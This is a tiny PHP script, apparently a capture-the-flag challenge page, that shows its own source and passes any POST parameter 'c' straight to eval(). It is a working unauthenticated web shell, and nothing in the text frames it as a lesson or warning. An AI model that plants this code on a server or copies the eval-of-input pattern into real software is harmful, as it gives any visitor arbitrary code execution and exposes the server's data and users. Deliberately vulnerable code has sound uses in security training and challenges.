<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);
}else{
    highlight_file(__FILE__);
}
?>